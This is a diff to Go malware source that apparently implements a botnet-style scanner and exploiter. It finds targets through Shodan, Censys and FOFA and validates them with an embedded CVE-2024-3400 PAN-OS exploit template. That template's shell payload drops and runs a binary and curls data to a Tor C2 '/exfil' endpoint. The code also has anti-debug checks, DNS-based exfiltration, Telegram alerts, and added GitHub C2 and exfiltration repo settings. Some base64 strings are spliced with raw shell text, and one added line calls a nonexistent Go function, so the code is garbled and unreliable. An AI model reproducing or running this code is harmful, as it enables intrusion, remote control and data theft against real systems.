@@ -42,21 +42,23 @@ var (
 	C2Key             = "INJECTED_C2_KEY_B64"
 	C2IV              = "INJECTED_C2_IV_B64"
 	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
-	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIs hHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkJFLUJNL0VYRklM"
+	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsIGh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vcmVwb3MvQkJCLUJNL0VYRklM"
 	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
-	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1z -k -JXPOST https://${TorC2Onion{}}/exfil -d P/tmp/.pp; rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
+	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHV3IC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1z -k -JXPOST https://${TorC2Onion{}}/exfil -d P/tmp/.pp; rm /dBXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
 	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
 // --- RUNTIME STATE ---
 var (
-	HostID     = ""
-	TelemetryQ = make(chan TelemetryEvent, 500)
-	WorkerPool = make(chan struct{}, 100)
-	Shutdown   = make(chan struct{})
-	DDRSeed    int64
-	APIKeys    APIKeyStore
-	AI         *FusionSentinel
+	HostID       = ""
+	TelemetryQ   = make(chan TelemetryEvent, 500)
+	WorkerPool   = make(chan struct{}, 100)
+	Shutdown     = make(chan struct{})
+	DDRSeed      int64
+	APIKeys      APIKeyStore
+	AI           *FusionSentinel
+	GitHubC2Repo string // Bound via -X ldflags
+	GitHubExfil  string // Bound via -X ldflags
 )
 
 const (
@@ -295,7 +297,7 @@ func isTraced() bool {
 	return bytes.Contains(data, []byte("TracerPid:\t"))
 }
 
-// --- FULLY SECURED DIRECT HTTP/HTTPS WRAPPER (TLS HANDSHAKE RESOLVED) ---
+// --- FULLY SECURED DIRECT HTTP/HTTPS WRAPPER ---
 func directHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
 	u, err := neturl.Parse(targetURL)
 	if err != nil {
@@ -370,7 +372,7 @@ func directHTTP(targetURL string, method string, body []byte, headers map[string
 	return respBytes, nil
 }
 
-// --- AI ENGINE: FUSION SENTINEL (EMBEDDED) ---
+// --- AI ENGINE: FUSION SENTINEL ---
 type FusionSentinel struct{ ModelLoaded bool }
 
 func NewFusionSentinel() *FusionSentinel {
@@ -411,7 +413,7 @@ func randFloat() float64 {
 	return float64(n.Int64()) / 1000.0
 }
 
-// --- INTEL ENGINE & ALL SEARCH ENGINES ---
+// --- INTEL ENGINE & SEARCH ENGINES ---
 type Target struct {
 	IP     string
 	Banner string
@@ -453,7 +455,6 @@ func searchEngines(vuln, geo, sector string) []Target {
 		}()
 	}
 
-	// 1. Shodan Module Active
 	if keys.Shodan != "" {
 		query("shodan", func() []Target {
 			var res []Target
@@ -492,7 +493,6 @@ func searchEngines(vuln, geo, sector string) []Target {
 		})
 	}
 
-	// 2. Censys Module Active
 	if keys.CensysID != "" && keys.CensysSec != "" {
 		query("censys", func() []Target {
 			var res []Target
@@ -530,7 +530,6 @@ func searchEngines(vuln, geo, sector string) []Target {
 		})
 	}
 
-	// 3. FOFA Module Active
 	if keys.FofaEmail != "" && keys.FofaKey != "" {
 		query("fofa", func() []Target {
 			var res []Target
@@ -589,7 +588,7 @@ func dedupTargets(t []Target) []Target {
 	return result
 }
 
-// --- NUCLEI-LIKE VALIDATION ENGINE ---
+// --- VALIDATION ENGINE ---
 func verifyVulnerable(target Target) bool {
 	templateData, err := base64.StdEncoding.DecodeString(NucleiTemplateB64)
 	if err != nil {
@@ -675,6 +674,18 @@ func getActiveOnion() string {
 }
 
 func getActiveRepo(action string) string {
+	if action == "c2" && GitHubC2Repo != "" {
+		if decoded, err := base64.RawURLEncoding.DecodeString(GitHubC2Repo); err == nil {
+			return string(decoded)
+		}
+		return GitHubC2Repo
+	}
+	if action == "exfil" && GitHubExfil != "" {
+		if decoded, err := base64.RawURLEncoding.DecodeString(GitHubExfil); err == nil {
+			return string(decoded)
+		}
+		return GitHubExfil
+	}
 	decoded := decryptConfig(RepoListB64)
 	list := strings.Split(decoded, ",")
 	index := (time.Now().UTC().Minute() / 15) % len(list)
@@ -761,7 +772,7 @@ func dnsExfilTTL(data []byte) bool {
 
 	for i, chunk := range chunks {
 		fqdn := fmt.Sprintf("%s.%s", chunk, domain)
-		ctx, cancel := context.WithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
+		ctx, cancel := context.ContextWithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
 		defer cancel()
 
 		TTL := (i*17 + len(chunk)) % 255
@@ -822,7 +833,6 @@ func telegramAlert(message string) {
 	payload.Set("text", message)
 	payload.Set("parse_mode", "Markdown")
 
-    // Using standard library http client for telegram alerts
 	client := &http.Client{Timeout: 10 * time.Second}
 	_, _ = client.PostForm(endpoint, payload)
 }
